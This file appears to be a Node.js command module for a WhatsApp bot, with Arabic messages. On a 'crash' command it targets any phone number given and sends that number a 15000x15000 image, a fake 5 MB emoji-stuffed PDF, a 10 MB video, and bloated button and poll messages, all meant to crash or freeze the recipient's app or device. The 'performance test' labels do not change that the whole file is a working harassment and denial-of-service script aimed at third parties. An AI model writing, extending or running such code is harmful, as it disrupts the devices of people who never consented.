const axios = require('axios');

module.exports = async ({ sock, msg, text, reply }) => {
  if (!text.startsWith("crash")) return;

  const parts = text.trim().split(/\s+/);
  const number = parts[1];
  const jid = `${number}@s.whatsapp.net`;

  if (!number || isNaN(number)) {
    return reply("❌ يرجى إدخال رقم صالح بعد الأمر.\nمثال: crash 9665xxxxxxx");
  }

  try {
    await reply(`🚨 جاري إرسال ملفات اختبار التعطيل إلى ${number}...`);

    // صورة ضخمة 15000x15000
    const hugeImageUrl = "https://via.placeholder.com/15000x15000.jpg?text=CRASH_TEST_IMAGE";
    const imgResp = await axios.get(hugeImageUrl, { responseType: 'arraybuffer' });
    const imgBuffer = Buffer.from(imgResp.data, 'binary');

    await sock.sendMessage(jid, {
      image: imgBuffer,
      caption: "📸 صورة ضخمة جداً لاختبار قدرة الجهاز"
    });

    // PDF ضخم 5 ميغابايت
    const bigText = '🔥'.repeat(5 * 1024 * 1024);
    const bigPdf = Buffer.from(`
      %PDF-1.4
      1 0 obj
      << /Type /Catalog /Pages 2 0 R >>
      endobj
      2 0 obj
      << /Type /Pages /Kids [3 0 R] /Count 1 >>
      endobj
      3 0 obj
      << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]
         /Contents 4 0 R /Resources << >> >>
      endobj
      4 0 obj
      << /Length ${bigText.length} >>
      stream
      ${bigText}
      endstream
      endobj
      xref
      0 5
      0000000000 65535 f
      0000000010 00000 n
      0000000065 00000 n
      0000000124 00000 n
      0000000220 00000 n
      trailer
      << /Root 1 0 R /Size 5 >>
      startxref
      300
      %%EOF
    `);

    await sock.sendMessage(jid, {
      document: bigPdf,
      mimetype: "application/pdf",
      fileName: "crash_test_file_5MB.pdf"
    });

    // فيديو ضخم 10 ميغابايت
    const videoUrl = "https://sample-videos.com/video123/mp4/720/big_buck_bunny_720p_10mb.mp4";
    const videoResp = await axios.get(videoUrl, { responseType: 'arraybuffer' });
    const videoBuffer = Buffer.from(videoResp.data, 'binary');

    await sock.sendMessage(jid, {
      video: videoBuffer,
      caption: "🎥 فيديو ضخم لاختبار الجهاز"
    });

    // رسالة أزرار ثقيلة
    await sock.sendMessage(jid, {
      text: '⚠️ رسالة أزرار ثقيلة جدًا لاختبار الأداء\n'.repeat(30),
      buttons: [
        { buttonId: 'btn1', buttonText: { displayText: 'اختبار 1' }, type: 1 },
        { buttonId: 'btn2', buttonText: { displayText: 'اختبار 2' }, type: 1 },
        { buttonId: 'btn3', buttonText: { displayText: 'اختبار 3' }, type: 1 },
      ],
      headerType: 1
    });

    // رسالة استفتاء (Poll)
    await sock.sendMessage(jid, {
      poll: {
        name: '🛑 استفتاء اختبار الأداء',
        options: [
          { optionName: 'اختيار 1' },
          { optionName: 'اختيار 2' },
          { optionName: 'اختيار 3' },
        ]
      },
      text: 'يرجى اختيار أحد الخيارات لاختبار استجابة الجهاز\n'.repeat(20)
    });

    await reply(`✅ تم إرسال ملفات وأوامر crash القوية إلى ${number}`);

  } catch (err) {
    console.error(err);
    await reply(`❌ فشل الإرسال إلى: ${number}\nالخطأ: ${err.message}`);
  }
};
